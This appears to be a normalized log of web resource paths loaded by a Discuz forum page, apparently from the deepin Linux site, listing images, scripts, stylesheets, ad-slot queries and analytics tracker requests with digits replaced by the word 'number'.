+staticjsseditor.js? number l
+dmsdownloadupdatesoftwaredefu number am_delta_b number fdd number ab number ef number bbb number ef number f number bc number eb number .exe
+xwbimagesxwb_base.css
+xwbimagesxwb_ number .css
+staticjsjquery  number . number . number .min.js
+ number _ number x number .jpg
+home.php?mod misc ac sendmail rand  number 
+staticjsdelay.js? number l
+staticjsfooter.js? number l
+xwbimagesbgimgsina_login_btn.png
+zh_cnhtmleditionimagesqunfamanagepicmode_light_s.png
+staticimagecommonqq_login.gif
+cprouic.js
+acom?di u number  dcb baidu_dup number _define dtm baidu_dup number _setjsonadslot dbv  number  dci  number  dri  number  dis  number  dai  number  dds  drs  number  dvi  number  ltu http  number a  number f  number fwww. number y number .com  number fshuma  number f number   number f number .html liu  ltr  lcr  ps  number x number  psr  number x number  par  number x number  pcs  number x number  pss  number x number  pis   number x  number  cfv  number  ccd  number  chi  number  cja false cpl  number  cmi  number  cce true col en us cec utf  number  cdo   number  tsr  number  tlm  number  tcn  number  tpr  number  dpt none coa  baidu_id 
+imagesrelevant_icon.gif
+acom?di u number  dcb baidu_dup number _define dtm baidu_dup number _setjsonadslot dbv  number  dci  number  dri  number  dis  number  dai  number  dds  drs  number  dvi  number  ltu http  number a  number f  number fwww. number y number .com  number fshuma  number f number   number f number .html liu  ltr  lcr  ps  number x number  psr  number x number  par  number x number  pcs  number x number  pss  number x number  pis   number x  number  cfv  number  ccd  number  chi  number  cja false cpl  number  cmi  number  cce true col en us cec utf  number  cdo   number  tsr  number  tlm  number  tcn  number  tpr  number  dpt none coa  baidu_id 
+imagessubvideoshare icon.png
+acom?di u number  dcb baidu_dup number _define dtm baidu_dup number _setjsonadslot dbv  number  dci  number  dri  number  dis  number  dai  number  dds  drs  number  dvi  number  ltu http  number a  number f  number fwww. number y number .com  number fshuma  number f number   number f number .html liu  ltr  lcr  ps  number x number  psr  number x number  par  number x number  pcs  number x number  pss  number x number  pis   number x  number  cfv  number  ccd  number  chi  number  cja false cpl  number  cmi  number  cce true col en us cec utf  number  cdo   number  tsr  number  tlm  number  tcn  number  tpr  number  dpt none coa  baidu_id 
+logininner_announce
+acom?di u number  dcb baidu_dup number _define dtm baidu_dup number _setjsonadslot dbv  number  dci  number  dri  number  dis  number  dai  number  dds  drs  number  dvi  number  ltu http  number a  number f  number fwww. number y number .com  number fshuma  number f number   number f number .html liu  ltr  lcr  ps  number x number  psr  number x number  par  number x number  pcs  number x number  pss  number x number  pis   number x  number  cfv  number  ccd  number  chi  number  cja false cpl  number  cmi  number  cce true col en us cec utf  number  cdo   number  tsr  number  tlm  number  tcn  number  tpr  number  dpt none coa  baidu_id 
+acom?di u number  dcb baidu_dup number _define dtm baidu_dup number _setjsonadslot dbv  number  dci  number  dri  number  dis  number  dai  number  dds  drs  number  dvi  number  ltu http  number a  number f  number fwww. number y number .com  number fshuma  number f number   number f number .html liu  ltr  lcr  ps  number x number  psr  number x number  par  number x number  pcs  number x number  pss  number x number  pis   number x  number  cfv  number  ccd  number  chi  number  cja false cpl  number  cmi  number  cce true col en us cec utf  number  cdo   number  tsr  number  tlm  number  tcn  number  tpr  number  dpt none coa  baidu_id 
+images number red dots.jpg
+acom?di u number  dcb baidu_dup number _define dtm baidu_dup number _setjsonadslot dbv  number  dci  number  dri  number  dis  number  dai  number  dds  drs  number  dvi  number  ltu http  number a  number f  number fwww. number y number .com  number fshuma  number f number   number f number .html liu  ltr  lcr  ps  number x number  psr  number x number  par  number x number  pcs  number x number  pss  number x number  pis   number x  number  cfv  number  ccd  number  chi  number  cja false cpl  number  cmi  number  cce true col en us cec utf  number  cdo   number  tsr  number  tlm  number  tcn  number  tpr  number  dpt none coa  baidu_id 
+
+acom?di u number  dcb baidu_dup number _define dtm baidu_dup number _setjsonadslot dbv  number  dci  number  dri  number  dis  number  dai  number  dds  drs  number  dvi  number  ltu http  number a  number f  number fwww. number y number .com  number fshuma  number f number   number f number .html liu  ltr  lcr  ps  number x number  psr  number x number  par  number x number  pcs  number x number  pss  number x number  pis   number x  number  cfv  number  ccd  number  chi  number  cja false cpl  number  cmi  number  cce true col en us cec utf  number  cdo   number  tsr  number  tlm  number  tcn  number  tpr  number  dpt none coa  baidu_id 
+images number rank number.gif
+acom?di u number  dcb baidu_dup number _define dtm baidu_dup number _setjsonadslot dbv  number  dci  number  dri  number  dis  number  dai  number  dds  drs  number  dvi  number  ltu http  number a  number f  number fwww. number y number .com  number fshuma  number f number   number f number .html liu  ltr  lcr  ps  number x number  psr  number x number  par  number x number  pcs  number x number  pss  number x number  pis   number x  number  cfv  number  ccd  number  chi  number  cja false cpl  number  cmi  number  cce true col en us cec utf  number  cdo   number  tsr  number  tlm  number  tcn  number  tpr  number  dpt none coa  baidu_id 
+ number .jpg
+acom?di u number  dcb baidu_dup number _define dtm baidu_dup number _setjsonadslot dbv  number  dci  number  dri  number  dis  number  dai  number  dds  drs  number  dvi  number  ltu http  number a  number f  number fwww. number y number .com  number fshuma  number f number   number f number .html liu  ltr  lcr  ps  number x number  psr  number x number  par  number x number  pcs  number x number  pss  number x number  pis   number x  number  cfv  number  ccd  number  chi  number  cja false cpl  number  cmi  number  cce true col en us cec utf  number  cdo   number  tsr  number  tlm  number  tcn  number  tpr  number  dpt none coa  baidu_id 
+images number video tl.gif
+apisitese?referer http  number a  number f  number fwww.baidu.com  number fs  number fie  number dutf  number   number f  number d number   number rsv_bp  number d number   number rsv_idx  number d number   number tn  number dbaidu  number wd  number ddeepin  number linux  number   number e number   number ae  number be  number e number   number bd  number ae  number e number   number d  number   number e number   number   number ip  number rsv_pq  number da number f number b number a number   number rsv_t  number d number fptubvx number op number p number ym  number b number r number igginsmsae number zsnppxln number vcmnciyphln number a  number rsv_enter  number d number   number inputt  number d number   number rsv_sug number   number d number   number rsv_sug number   number d number   number rsv_sug number   number d number   number rsv_sug number   number d number  response_type js s_id  number  s_site_gid  number  s_site_uid  number  ts  number  sig d number fce number cb number fb number b number c number b number 
+ps_fp.htm?pid ps fp  number bd number a number d number d number b number b number ad number de number f number  im  number  wf  number  br  number  qid a number d number c number  bi f number b number e number cca number e number b number a number b number d:fg  number 
+cloudscriptsdiscuz_tips.js?v  number 
+acom?di u number  dcb baidu_dup number _define dtm baidu_dup number _setjsonadslot dbv  number  dci  number  dri  number  dis  number  dai  number  dds  drs  number  dvi  number  ltu http  number a  number f  number fwww. number y number .com  number fshuma  number f number   number f number .html liu  ltr  lcr  ps  number x number  psr  number x number  par  number x number  pcs  number x number  pss  number x number  pis   number x  number  cfv  number  ccd  number  chi  number  cja false cpl  number  cmi  number  cce true col en us cec utf  number  cdo   number  tsr  number  tlm  number  tcn  number  tpr  number  dpt none coa  baidu_id 
+stat.php?id  number  web_id  number  show pic
+stlist number .php
+ping.js?v  number verhash
+staticimagecommonbackground.png
+staticimagedeepin number logo_line.jpg
+staticimagedeepin number logo_bg.jpg
+staticimagedeepin number menu_bg.jpg
+staticimagedeepin number head_bg.jpg
+cgi binmail_spam?sid l bqx dmjhlgct number r stat getcopycontent content thlwuyyvyharehdeycnbsrdgu number wliyzb t getcopycontent action copy_link sid l bqx dmjhlgct number r
+staticimagedeepin number normal_logo.jpg
+heatmap number mju number ndi number mw  .js?rand  number 
+stping number ?v  h  number aa number af number be number c number bef number b number d number c number  ts  number 
+staticimagedeepin number menu_hov.jpg
+h.js? number ecb number bb number d number e number dda number e number bd
+staticimagedeepin number login.jpg
+staticimagecommonarw_l.gif
+staticimagecommonhome.gif
+staticimagefeedpoke.gif
+staticimagecommonpmto.gif
+staticimagefeedfriend.gif
+staticimagedeepin number sou.gif
+staticimagecommonsearch.png
+staticimagecommonpx.png
+ex?i mm_ number _ number _ number 
+staticimagedeepin number head_line.jpg
+jsiframe.js?uyuserid  number 
+staticimagedeepin number menu_line.jpg
+staticimagecommonpt_item.png
+xwbimagesbgimgicon_off.gif
+staticimagecommonpn_post.png
+stat.php?id  number  web_id  number 
+uc_serverdataavatar number _avatar_middle.jpg
+staticimagecommonfj_btn.png
+staticimagecommonthread prev.png
+staticimagecommonprint.png
+staticimagecommonthread next.png
+staticimagecommononline_member.gif
+staticimageslike.png?cdnversion  number 
+staticjsshell_v number .js?t  number 
+staticjscommon_extra.js? number l
+core.php?web_id  number  t z
+dmsdownloadupdatesoftwaredefu number am_delta_b number fdd number ab number ef number bbb number ef number f number bc number eb number .exe
+staticimagecommonuserinfo.gif
+staticimagemagiccheckonline.small.gif
+staticjsbds_s_v number .js?cdnversion  number 
+staticimagecommonqzone.gif
+staticimagecommonweibo.png
+staticimagecommonpengyou.png
+ex?i mm_ number _ number _ number 
+configx number b.html
+staticcssbdsstyle.css?cdnversion  number 
+ttanxssp.js
+staticimagecommonoshr.png
+ttanxsspmain.js
+staticimagecommonfav.gif
+stat.htm?id  number  r  lg en us ntime none cnzz_eid  number   number   showp  number x number  t wirelurker... h  number  rnd  number 
+xwbimagesbgimgicon_logo.png
